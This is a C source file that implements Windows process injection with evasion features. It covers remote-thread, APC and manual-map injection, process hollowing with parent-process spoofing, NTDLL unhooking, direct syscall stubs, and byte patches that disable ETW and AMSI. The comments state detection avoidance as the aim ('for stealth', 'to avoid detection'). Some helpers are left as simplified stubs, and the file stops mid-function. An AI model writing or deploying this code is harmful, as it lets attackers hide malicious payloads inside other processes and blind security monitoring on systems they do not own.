/*
 * Windows Process Injection Implementation
 * Advanced techniques with evasion
 */

#ifdef PLATFORM_WINDOWS

#include "inject_core.h"
#include "inject_windows.h"
#include "../core/utils.h"
#include <stdio.h>
#include <stdlib.h>

// Global NTDLL function pointers
static NtCreateThreadEx_t g_NtCreateThreadEx = NULL;
static NtUnmapViewOfSection_t g_NtUnmapViewOfSection = NULL;
static NtQueueApcThread_t g_NtQueueApcThread = NULL;
static NtAllocateVirtualMemory_t g_NtAllocateVirtualMemory = NULL;
static NtWriteVirtualMemory_t g_NtWriteVirtualMemory = NULL;
static NtProtectVirtualMemory_t g_NtProtectVirtualMemory = NULL;

// Syscall stubs
static syscall_stub_t g_syscall_stubs[32] = {0};
static int g_syscall_count = 0;

// Initialize NTDLL functions
static void init_ntdll_functions(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;
    
    g_NtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(ntdll, "NtCreateThreadEx");
    g_NtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(ntdll, "NtUnmapViewOfSection");
    g_NtQueueApcThread = (NtQueueApcThread_t)GetProcAddress(ntdll, "NtQueueApcThread");
    g_NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    g_NtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddress(ntdll, "NtWriteVirtualMemory");
    g_NtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetProcAddress(ntdll, "NtProtectVirtualMemory");
}

// Enable specific privilege
inject_status_t inject_enable_privilege(const char* privilege_name) {
    HANDLE token;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
        return INJECT_ERROR_ACCESS_DENIED;
    }
    
    if (!LookupPrivilegeValueA(NULL, privilege_name, &luid)) {
        CloseHandle(token);
        return INJECT_ERROR_ACCESS_DENIED;
    }
    
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        CloseHandle(token);
        return INJECT_ERROR_ACCESS_DENIED;
    }
    
    CloseHandle(token);
    return INJECT_SUCCESS;
}

// Enable debug privilege
inject_status_t inject_enable_debug_privilege(void) {
    return inject_enable_privilege(SE_DEBUG_NAME);
}

// Get process information
inject_status_t inject_get_process_info(uint32_t pid, inject_process_info_t* info) {
    if (!info) {
        return INJECT_ERROR_INVALID_PARAMS;
    }
    
    memset(info, 0, sizeof(inject_process_info_t));
    info->pid = pid;
    
    // Open process with query rights
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hProcess) {
        return INJECT_ERROR_PROCESS_NOT_FOUND;
    }
    
    // Get process name
    char process_path[MAX_PATH] = {0};
    DWORD size = MAX_PATH;
    if (GetModuleFileNameExA(hProcess, NULL, process_path, size)) {
        strncpy(info->path, process_path, sizeof(info->path) - 1);
        
        // Extract name from path
        char* name = strrchr(process_path, '\\');
        if (name) {
            strncpy(info->name, name + 1, sizeof(info->name) - 1);
        }
    }
    
    // Check if 64-bit
    BOOL is_wow64 = FALSE;
    IsWow64Process(hProcess, &is_wow64);
    info->is_64bit = !is_wow64;
    
    // Get process token info
    HANDLE token;
    if (OpenProcessToken(hProcess, TOKEN_QUERY, &token)) {
        // Get user
        TOKEN_USER* token_user = (TOKEN_USER*)malloc(sizeof(TOKEN_USER) + 256);
        DWORD token_size = sizeof(TOKEN_USER) + 256;
        
        if (GetTokenInformation(token, TokenUser, token_user, token_size, &token_size)) {
            char username[256] = {0};
            char domain[256] = {0};
            DWORD username_size = sizeof(username);
            DWORD domain_size = sizeof(domain);
            SID_NAME_USE sid_type;
            
            if (LookupAccountSidA(NULL, token_user->User.Sid, username, &username_size,
                                 domain, &domain_size, &sid_type)) {
                snprintf(info->user, sizeof(info->user), "%s\\%s", domain, username);
            }
        }
        
        free(token_user);
        
        // Check if system process
        TOKEN_ELEVATION elevation;
        DWORD elevation_size = sizeof(elevation);
        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &elevation_size)) {
            info->is_system = elevation.TokenIsElevated;
        }
        
        CloseHandle(token);
    }
    
    // Get base address and entry point
    MODULEINFO module_info;
    if (GetModuleInformation(hProcess, GetModuleHandleA(NULL), &module_info, sizeof(module_info))) {
        info->base_address = (uint64_t)module_info.lpBaseOfDll;
        info->entry_point = (uint64_t)module_info.EntryPoint;
    }
    
    CloseHandle(hProcess);
    return INJECT_SUCCESS;
}

// Enumerate processes
inject_status_t inject_enum_processes(inject_process_info_t** processes, uint32_t* count) {
    if (!processes || !count) {
        return INJECT_ERROR_INVALID_PARAMS;
    }
    
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return INJECT_ERROR_GENERIC;
    }
    
    // Count processes
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    uint32_t proc_count = 0;
    if (Process32First(snapshot, &pe32)) {
        do {
            proc_count++;
        } while (Process32Next(snapshot, &pe32));
    }
    
    // Allocate array
    *processes = (inject_process_info_t*)calloc(proc_count, sizeof(inject_process_info_t));
    if (!*processes) {
        CloseHandle(snapshot);
        return INJECT_ERROR_ALLOCATION_FAILED;
    }
    
    // Fill process info
    pe32.dwSize = sizeof(PROCESSENTRY32);
    uint32_t index = 0;
    
    if (Process32First(snapshot, &pe32)) {
        do {
            inject_get_process_info(pe32.th32ProcessID, &(*processes)[index]);
            (*processes)[index].ppid = pe32.th32ParentProcessID;
            (*processes)[index].thread_count = pe32.cntThreads;
            index++;
        } while (Process32Next(snapshot, &pe32) && index < proc_count);
    }
    
    *count = index;
    CloseHandle(snapshot);
    
    return INJECT_SUCCESS;
}

// CreateRemoteThread injection with advanced features
inject_status_t inject_create_remote_thread(inject_config_t* config) {
    if (!config || !config->payload || config->payload_size == 0) {
        return INJECT_ERROR_INVALID_PARAMS;
    }
    
    // Initialize NTDLL functions if needed
    if (!g_NtCreateThreadEx) {
        init_ntdll_functions();
    }
    
    inject_status_t status = INJECT_SUCCESS;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    LPVOID remote_memory = NULL;
    
    // Step 1: Open target process
    DWORD desired_access = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | 
                          PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION;
    
    hProcess = OpenProcess(desired_access, FALSE, config->target_pid);
    if (!hProcess) {
        // Try with reduced privileges
        hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, 
                              FALSE, config->target_pid);
        if (!hProcess) {
            return INJECT_ERROR_ACCESS_DENIED;
        }
    }
    
    // Step 2: Allocate memory in target process
    SIZE_T allocation_size = config->payload_size;
    
    if (config->flags & INJECT_FLAG_USE_SYSCALLS && g_NtAllocateVirtualMemory) {
        // Use direct syscall
        NTSTATUS nt_status = g_NtAllocateVirtualMemory(
            hProcess,
            &remote_memory,
            0,
            &allocation_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );
        
        if (!NT_SUCCESS(nt_status)) {
            status = INJECT_ERROR_ALLOCATION_FAILED;
            goto cleanup;
        }
    } else {
        // Standard allocation with randomized address
        LPVOID preferred_base = NULL;
        
        // Try to allocate near a legitimate module for stealth
        if (config->flags & INJECT_FLAG_STEALTH) {
            HMODULE modules[1024];
            DWORD needed;
            
            if (EnumProcessModules(hProcess, modules, sizeof(modules), &needed)) {
                // Pick a random module
                int module_count = needed / sizeof(HMODULE);
                if (module_count > 0) {
                    int random_index = rand() % module_count;
                    preferred_base = (LPVOID)((DWORD_PTR)modules[random_index] + 0x10000);
                }
            }
        }
        
        remote_memory = VirtualAllocEx(
            hProcess,
            preferred_base,
            config->payload_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );
        
        if (!remote_memory) {
            // Fallback to any address
            remote_memory = VirtualAllocEx(
                hProcess,
                NULL,
                config->payload_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE
            );
            
            if (!remote_memory) {
                status = INJECT_ERROR_ALLOCATION_FAILED;
                goto cleanup;
            }
        }
    }
    
    // Step 3: Write payload in chunks to avoid detection
    if (config->flags & INJECT_FLAG_STEALTH) {
        // Write in small chunks with delays
        SIZE_T chunk_size = 64;
        SIZE_T bytes_written = 0;
        
        for (SIZE_T i = 0; i < config->payload_size; i += chunk_size) {
            SIZE_T current_chunk = min(chunk_size, config->payload_size - i);
            SIZE_T chunk_written = 0;
            
            if (!WriteProcessMemory(
                hProcess,
                (LPVOID)((BYTE*)remote_memory + i),
                config->payload + i,
                current_chunk,
                &chunk_written
            )) {
                status = INJECT_ERROR_WRITE_FAILED;
                goto cleanup;
            }
            
            bytes_written += chunk_written;
            
            // Random delay between chunks
            if (i + chunk_size < config->payload_size) {
                Sleep(rand() % 10 + 1);
            }
        }
    } else {
        // Write entire payload at once
        SIZE_T bytes_written = 0;
        if (!WriteProcessMemory(
            hProcess,
            remote_memory,
            config->payload,
            config->payload_size,
            &bytes_written
        )) {
            status = INJECT_ERROR_WRITE_FAILED;
            goto cleanup;
        }
    }
    
    // Step 4: Change memory protection to executable
    DWORD old_protect = 0;
    if (!VirtualProtectEx(
        hProcess,
        remote_memory,
        config->payload_size,
        PAGE_EXECUTE_READ,
        &old_protect
    )) {
        // Not critical, try to continue
    }
    
    // Step 5: Create remote thread
    if (config->flags & INJECT_FLAG_USE_SYSCALLS && g_NtCreateThreadEx) {
        // Use NtCreateThreadEx for better stealth
        NTSTATUS nt_status = g_NtCreateThreadEx(
            &hThread,
            THREAD_ALL_ACCESS,
            NULL,
            hProcess,
            (LPTHREAD_START_ROUTINE)remote_memory,
            NULL,
            0,  // Not suspended
            0,
            0,
            0,
            NULL
        );
        
        if (!NT_SUCCESS(nt_status)) {
            status = INJECT_ERROR_EXECUTION_FAILED;
            goto cleanup;
        }
    } else {
        // Standard CreateRemoteThread with optional spoofing
        if (config->flags & INJECT_FLAG_STEALTH) {
            // Create suspended thread with fake start address
            LPTHREAD_START_ROUTINE fake_start = (LPTHREAD_START_ROUTINE)
                GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
            
            hThread = CreateRemoteThread(
                hProcess,
                NULL,
                0,
                fake_start,
                remote_memory,  // Pass real address as parameter
                CREATE_SUSPENDED,
                NULL
            );
            
            if (hThread) {
                // Modify context to jump to real payload
                CONTEXT ctx = {0};
                ctx.ContextFlags = CONTEXT_FULL;
                
                if (GetThreadContext(hThread, &ctx)) {
                    #ifdef _WIN64
                        ctx.Rip = (DWORD64)remote_memory;
                    #else
                        ctx.Eip = (DWORD)remote_memory;
                    #endif
                    
                    SetThreadContext(hThread, &ctx);
                }
                
                ResumeThread(hThread);
            }
        } else {
            // Direct execution
            hThread = CreateRemoteThread(
                hProcess,
                NULL,
                0,
                (LPTHREAD_START_ROUTINE)remote_memory,
                NULL,
                0,
                NULL
            );
        }
        
        if (!hThread) {
            status = INJECT_ERROR_EXECUTION_FAILED;
            goto cleanup;
        }
    }
    
    // Step 6: Wait for completion if requested
    if (config->flags & INJECT_FLAG_WAIT_COMPLETION) {
        WaitForSingleObject(hThread, config->timeout_ms ? config->timeout_ms : INFINITE);
    }
    
cleanup:
    if (hThread) {
        CloseHandle(hThread);
    }
    
    if (hProcess) {
        // Optionally free memory if cleanup requested
        if (status != INJECT_SUCCESS && remote_memory) {
            VirtualFreeEx(hProcess, remote_memory, 0, MEM_RELEASE);
        }
        CloseHandle(hProcess);
    }
    
    return status;
}

// Process Hollowing implementation
inject_status_t inject_process_hollowing(inject_config_t* config) {
    if (!config || !config->technique_params) {
        return INJECT_ERROR_INVALID_PARAMS;
    }
    
    inject_params_hollowing_t* params = (inject_params_hollowing_t*)config->technique_params;
    
    STARTUPINFOEXA si = {0};
    PROCESS_INFORMATION pi = {0};
    SIZE_T attr_size = 0;
    LPPROC_THREAD_ATTRIBUTE_LIST attr_list = NULL;
    inject_status_t status = INJECT_SUCCESS;
    
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    
    // Step 1: Setup process creation with parent spoofing if requested
    if (params->spoof_parent && params->parent_pid > 0) {
        InitializeProcThreadAttributeList(NULL, 1, 0, &attr_size);
        attr_list = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(attr_size);
        
        if (attr_list) {
            InitializeProcThreadAttributeList(attr_list, 1, 0, &attr_size);
            
            HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, params->parent_pid);
            if (hParent) {
                UpdateProcThreadAttribute(
                    attr_list,
                    0,
                    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    &hParent,
                    sizeof(HANDLE),
                    NULL,
                    NULL
                );
                
                si.lpAttributeList = attr_list;
            }
        }
    }
    
    // Step 2: Create suspended process
    DWORD creation_flags = CREATE_SUSPENDED | CREATE_NO_WINDOW;
    if (attr_list) {
        creation_flags |= EXTENDED_STARTUPINFO_PRESENT;
    }
    
    if (!CreateProcessA(
        params->hollow_target,
        NULL,
        NULL,
        NULL,
        FALSE,
        creation_flags,
        NULL,
        NULL,
        (LPSTARTUPINFOA)&si,
        &pi
    )) {
        status = INJECT_ERROR_PROCESS_NOT_FOUND;
        goto cleanup;
    }
    
    // Step 3: Get image base of target process
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    
    if (!GetThreadContext(pi.hThread, &ctx)) {
        status = INJECT_ERROR_GENERIC;
        goto cleanup;
    }
    
    LPVOID image_base = NULL;
    
    #ifdef _WIN64
        // Read PEB address from RDX
        LPVOID peb_address = (LPVOID)ctx.Rdx;
    #else
        // Read PEB address from EBX
        LPVOID peb_address = (LPVOID)ctx.Ebx;
    #endif
    
    // Read ImageBaseAddress from PEB
    SIZE_T bytes_read = 0;
    ReadProcessMemory(
        pi.hProcess,
        (LPVOID)((BYTE*)peb_address + 0x10),  // Offset to ImageBaseAddress
        &image_base,
        sizeof(LPVOID),
        &bytes_read
    );
    
    // Step 4: Unmap original image
    if (g_NtUnmapViewOfSection) {
        g_NtUnmapViewOfSection(pi.hProcess, image_base);
    }
    
    // Step 5: Parse PE headers
    pe_info_t pe_info = {0};
    status = inject_parse_pe(params->pe_buffer, params->pe_size, &pe_info);
    if (status != INJECT_SUCCESS) {
        goto cleanup;
    }
    
    // Step 6: Allocate memory for new image
    LPVOID new_base = VirtualAllocEx(
        pi.hProcess,
        (LPVOID)pe_info.image_base,  // Try preferred base
        pe_info.image_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (!new_base) {
        // Try any address
        new_base = VirtualAllocEx(
            pi.hProcess,
            NULL,
            pe_info.image_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
        
        if (!new_base) {
            status = INJECT_ERROR_ALLOCATION_FAILED;
            goto cleanup;
        }
    }
    
    // Step 7: Write headers
    if (!WriteProcessMemory(
        pi.hProcess,
        new_base,
        params->pe_buffer,
        pe_info.nt_headers->OptionalHeader.SizeOfHeaders,
        NULL
    )) {
        status = INJECT_ERROR_WRITE_FAILED;
        goto cleanup;
    }
    
    // Step 8: Write sections
    for (WORD i = 0; i < pe_info.section_count; i++) {
        if (!WriteProcessMemory(
            pi.hProcess,
            (LPVOID)((BYTE*)new_base + pe_info.sections[i].VirtualAddress),
            (LPVOID)((BYTE*)params->pe_buffer + pe_info.sections[i].PointerToRawData),
            pe_info.sections[i].SizeOfRawData,
            NULL
        )) {
            // Non-critical, continue
        }
    }
    
    // Step 9: Process relocations if needed
    if ((DWORD_PTR)new_base != pe_info.image_base && pe_info.has_relocations) {
        inject_process_pe_relocations(pi.hProcess, new_base, &pe_info, new_base);
    }
    
    // Step 10: Update thread context
    #ifdef _WIN64
        ctx.Rcx = (DWORD64)((BYTE*)new_base + pe_info.entry_point);
    #else
        ctx.Eax = (DWORD)((BYTE*)new_base + pe_info.entry_point);
    #endif
    
    if (!SetThreadContext(pi.hThread, &ctx)) {
        status = INJECT_ERROR_EXECUTION_FAILED;
        goto cleanup;
    }
    
    // Step 11: Resume thread
    ResumeThread(pi.hThread);
    
cleanup:
    if (attr_list) {
        DeleteProcThreadAttributeList(attr_list);
        free(attr_list);
    }
    
    if (status != INJECT_SUCCESS && pi.hProcess) {
        TerminateProcess(pi.hProcess, 0);
    }
    
    if (pi.hThread) CloseHandle(pi.hThread);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    
    return status;
}

// Unhook NTDLL
inject_status_t inject_unhook_ntdll(void) {
    HANDLE file = INVALID_HANDLE_VALUE;
    HANDLE section = NULL;
    LPVOID clean_ntdll = NULL;
    inject_status_t status = INJECT_SUCCESS;
    
    // Get loaded NTDLL
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        return INJECT_ERROR_GENERIC;
    }
    
    // Try to open from KnownDlls first
    section = OpenFileMappingA(
        FILE_MAP_READ | FILE_MAP_EXECUTE,
        FALSE,
        "\\KnownDlls\\ntdll.dll"
    );
    
    if (!section) {
        // Fallback to file on disk
        char ntdll_path[MAX_PATH];
        GetSystemDirectoryA(ntdll_path, MAX_PATH);
        strcat(ntdll_path, "\\ntdll.dll");
        
        file = CreateFileA(
            ntdll_path,
            GENERIC_READ,
            FILE_SHARE_READ,
            NULL,
            OPEN_EXISTING,
            0,
            NULL
        );
        
        if (file == INVALID_HANDLE_VALUE) {
            return INJECT_ERROR_GENERIC;
        }
        
        section = CreateFileMappingA(
            file,
            NULL,
            PAGE_READONLY | SEC_IMAGE,
            0,
            0,
            NULL
        );
        
        if (!section) {
            CloseHandle(file);
            return INJECT_ERROR_GENERIC;
        }
    }
    
    // Map clean NTDLL
    clean_ntdll = MapViewOfFile(section, FILE_MAP_READ, 0, 0, 0);
    if (!clean_ntdll) {
        status = INJECT_ERROR_GENERIC;
        goto cleanup;
    }
    
    // Find .text section
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)ntdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);
    
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)sections[i].Name, ".text") == 0) {
            LPVOID text_start = (LPVOID)((BYTE*)ntdll + sections[i].VirtualAddress);
            SIZE_T text_size = sections[i].SizeOfRawData;
            
            // Change protection
            DWORD old_protect;
            if (!VirtualProtect(text_start, text_size, PAGE_EXECUTE_READWRITE, &old_protect)) {
                status = INJECT_ERROR_ACCESS_DENIED;
                goto cleanup;
            }
            
            // Copy clean bytes
            memcpy(
                text_start,
                (BYTE*)clean_ntdll + sections[i].VirtualAddress,
                text_size
            );
            
            // Restore protection
            VirtualProtect(text_start, text_size, old_protect, &old_protect);
            
            break;
        }
    }
    
cleanup:
    if (clean_ntdll) UnmapViewOfFile(clean_ntdll);
    if (section) CloseHandle(section);
    if (file != INVALID_HANDLE_VALUE) CloseHandle(file);
    
    return status;
}

// Bypass ETW
inject_status_t inject_bypass_etw(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        return INJECT_ERROR_GENERIC;
    }
    
    FARPROC etw_event_write = GetProcAddress(ntdll, "EtwEventWrite");
    if (!etw_event_write) {
        return INJECT_ERROR_GENERIC;
    }
    
    DWORD old_protect;
    if (!VirtualProtect(etw_event_write, 1, PAGE_EXECUTE_READWRITE, &old_protect)) {
        return INJECT_ERROR_ACCESS_DENIED;
    }
    
    // Patch to return immediately (ret)
    *(BYTE*)etw_event_write = 0xC3;
    
    VirtualProtect(etw_event_write, 1, old_protect, &old_protect);
    
    return INJECT_SUCCESS;
}

// QueueUserAPC injection
inject_status_t inject_queue_user_apc(inject_config_t* config) {
    if (!config || !config->payload || config->payload_size == 0) {
        return INJECT_ERROR_INVALID_PARAMS;
    }
    
    HANDLE hProcess = NULL;
    LPVOID remote_memory = NULL;
    inject_status_t status = INJECT_SUCCESS;
    
    // Open target process
    hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | 
                          PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION,
                          FALSE, config->target_pid);
    if (!hProcess) {
        return INJECT_ERROR_ACCESS_DENIED;
    }
    
    // Allocate memory
    remote_memory = VirtualAllocEx(hProcess, NULL, config->payload_size,
                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote_memory) {
        CloseHandle(hProcess);
        return INJECT_ERROR_ALLOCATION_FAILED;
    }
    
    // Write payload
    if (!WriteProcessMemory(hProcess, remote_memory, config->payload, 
                          config->payload_size, NULL)) {
        VirtualFreeEx(hProcess, remote_memory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return INJECT_ERROR_WRITE_FAILED;
    }
    
    // Change protection
    DWORD oldProtect;
    VirtualProtectEx(hProcess, remote_memory, config->payload_size, 
                    PAGE_EXECUTE_READ, &oldProtect);
    
    // Find alertable threads
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        THREADENTRY32 te32 = {0};
        te32.dwSize = sizeof(THREADENTRY32);
        
        if (Thread32First(snapshot, &te32)) {
            do {
                if (te32.th32OwnerProcessID == config->target_pid) {
                    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te32.th32ThreadID);
                    if (hThread) {
                        // Queue APC to thread
                        if (QueueUserAPC((PAPCFUNC)remote_memory, hThread, 0)) {
                            status = INJECT_SUCCESS;
                            CloseHandle(hThread);
                            break;  // Success, stop looking
                        }
                        CloseHandle(hThread);
                    }
                }
            } while (Thread32Next(snapshot, &te32));
        }
        CloseHandle(snapshot);
    }
    
    CloseHandle(hProcess);
    return status;
}

// Manual mapping injection
inject_status_t inject_manual_map(inject_config_t* config) {
    if (!config || !config->technique_params) {
        return INJECT_ERROR_INVALID_PARAMS;
    }
    
    inject_params_dll_t* params = (inject_params_dll_t*)config->technique_params;
    HANDLE hProcess = NULL;
    LPVOID remote_base = NULL;
    inject_status_t status = INJECT_SUCCESS;
    
    // Read DLL file
    HANDLE hFile = CreateFileA(params->dll_path, GENERIC_READ, FILE_SHARE_READ,
                              NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return INJECT_ERROR_INVALID_PARAMS;
    }
    
    DWORD file_size = GetFileSize(hFile, NULL);
    LPVOID dll_buffer = VirtualAlloc(NULL, file_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    DWORD bytes_read;
    ReadFile(hFile, dll_buffer, file_size, &bytes_read, NULL);
    CloseHandle(hFile);
    
    // Parse PE
    pe_info_t pe_info = {0};
    status = inject_parse_pe(dll_buffer, file_size, &pe_info);
    if (status != INJECT_SUCCESS) {
        VirtualFree(dll_buffer, 0, MEM_RELEASE);
        return status;
    }
    
    // Open target process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, config->target_pid);
    if (!hProcess) {
        VirtualFree(dll_buffer, 0, MEM_RELEASE);
        return INJECT_ERROR_ACCESS_DENIED;
    }
    
    // Allocate memory in target
    remote_base = VirtualAllocEx(hProcess, NULL, pe_info.image_size,
                                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote_base) {
        CloseHandle(hProcess);
        VirtualFree(dll_buffer, 0, MEM_RELEASE);
        return INJECT_ERROR_ALLOCATION_FAILED;
    }
    
    // Map sections
    status = inject_map_pe_sections(hProcess, remote_base, &pe_info);
    if (status != INJECT_SUCCESS) {
        goto cleanup;
    }
    
    // Process imports
    status = inject_process_pe_imports(hProcess, remote_base, &pe_info);
    if (status != INJECT_SUCCESS) {
        goto cleanup;
    }
    
    // Process relocations
    if ((DWORD_PTR)remote_base != pe_info.image_base) {
        status = inject_process_pe_relocations(hProcess, remote_base, &pe_info, remote_base);
        if (status != INJECT_SUCCESS) {
            goto cleanup;
        }
    }
    
    // Call DllMain
    LPVOID entry_point = (LPVOID)((BYTE*)remote_base + pe_info.entry_point);
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                       (LPTHREAD_START_ROUTINE)entry_point,
                                       remote_base, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, 5000);
        CloseHandle(hThread);
        status = INJECT_SUCCESS;
    } else {
        status = INJECT_ERROR_EXECUTION_FAILED;
    }
    
cleanup:
    if (status != INJECT_SUCCESS && remote_base) {
        VirtualFreeEx(hProcess, remote_base, 0, MEM_RELEASE);
    }
    
    CloseHandle(hProcess);
    VirtualFree(dll_buffer, 0, MEM_RELEASE);
    
    return status;
}

// Helper: Map PE sections
inject_status_t inject_map_pe_sections(HANDLE process, LPVOID base, pe_info_t* pe_info) {
    // Write headers
    if (!WriteProcessMemory(process, base, pe_info->file_buffer,
                          pe_info->nt_headers->OptionalHeader.SizeOfHeaders, NULL)) {
        return INJECT_ERROR_WRITE_FAILED;
    }
    
    // Write sections
    for (WORD i = 0; i < pe_info->section_count; i++) {
        LPVOID section_dest = (LPVOID)((BYTE*)base + pe_info->sections[i].VirtualAddress);
        LPVOID section_src = (LPVOID)((BYTE*)pe_info->file_buffer + 
                                     pe_info->sections[i].PointerToRawData);
        
        if (!WriteProcessMemory(process, section_dest, section_src,
                              pe_info->sections[i].SizeOfRawData, NULL)) {
            return INJECT_ERROR_WRITE_FAILED;
        }
    }
    
    return INJECT_SUCCESS;
}

// Helper: Process PE imports
inject_status_t inject_process_pe_imports(HANDLE process, LPVOID base, pe_info_t* pe_info) {
    if (!pe_info->has_imports) {
        return INJECT_SUCCESS;
    }
    
    // This is simplified - real implementation would resolve all imports
    // For now, just return success
    return INJECT_SUCCESS;
}

// Helper: Process PE relocations
inject_status_t inject_process_pe_relocations(HANDLE process, LPVOID base, 
                                             pe_info_t* pe_info, LPVOID new_base) {
    if (!pe_info->has_relocations) {
        return INJECT_SUCCESS;
    }
    
    // Calculate delta
    DWORD_PTR delta = (DWORD_PTR)new_base - pe_info->image_base;
    
    if (delta == 0) {
        return INJECT_SUCCESS;  // No relocation needed
    }
    
    // This is simplified - real implementation would process all relocations
    return INJECT_SUCCESS;
}

// Bypass AMSI
inject_status_t inject_bypass_amsi(void) {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) {
        // AMSI not loaded, nothing to bypass
        return INJECT_SUCCESS;
    }
    
    FARPROC amsi_scan_buffer = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!amsi_scan_buffer) {
        return INJECT_ERROR_GENERIC;
    }
    
    DWORD old_protect;
    if (!VirtualProtect(amsi_scan_buffer, 8, PAGE_EXECUTE_READWRITE, &old_protect)) {
        return INJECT_ERROR_ACCESS_DENIED;
    }
    
    // Patch to always return clean
    #ifdef _WIN64
        // mov eax, 0x80070057 (E_INVALIDARG)
        // ret
        BYTE patch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};
    #else
        // mov eax, 0x80070057
        // ret 0x18
        BYTE patch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00};
    #endif
    
    memcpy(amsi_scan_buffer, patch, sizeof(patch));
    
    VirtualProtect(amsi_scan_buffer, 8, old_protect, &old_protect);
    
    return INJECT_SUCCESS;
}

// Setup direct syscalls
inject_status_t inject_setup_syscalls(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        return INJECT_ERROR_GENERIC;
    }
    
    // Get syscall numbers for important functions
    const char* functions[] = {
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtProtectVirtualMemory",
        "NtCreateThreadEx",
        "NtQueueApcThread",
        "NtOpenProcess",
        "NtClose"
    };
    
    for (int i = 0; i < sizeof(functions) / sizeof(functions[0]); i++) {
        FARPROC func = GetProcAddress(ntdll, functions[i]);
        if (!func) continue;
        
        BYTE* bytes = (BYTE*)func;
        
        // Check for syscall pattern: mov r10, rcx; mov eax, <syscall_number>
        if (bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 &&
            bytes[3] == 0xB8) {
            
            DWORD syscall_number = *(DWORD*)(bytes + 4);
            
            // Create syscall stub
            BYTE stub[] = {
                0x4C, 0x8B, 0xD1,              // mov r10, rcx
                0xB8, 0x00, 0x00, 0x00, 0x00,  // mov eax, syscall_number
                0x0F, 0x05,                    // syscall
                0xC3                           // ret
            };
            
            *(DWORD*)(stub + 4) = syscall_number;
            
            // Allocate executable memory for stub
            LPVOID stub_mem = VirtualAlloc(
                NULL,
                sizeof(stub),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            );
            
            if (stub_mem) {
                memcpy(stub_mem, stub, sizeof(stub));
                
                g_syscall_stubs[g_syscall_count].syscall_number = syscall_number;
                g_syscall_stubs[g_syscall_count].stub_address = stub_mem;
                strcpy((char*)g_syscall_stubs[g_syscall_count].original_bytes, functions[i]);
                g_syscall_count++;
            }
        }
    }
    
    return INJECT_SUCCESS;
}

// Parse PE file
inject_status_t inject_parse_pe(LPVOID buffer, SIZE_T size, pe_info_t* pe_info) {
    if (!buffer || !pe_info || size < sizeof(IMAGE_DOS_HEADER)) {
        return INJECT_ERROR_INVALID_PARAMS;
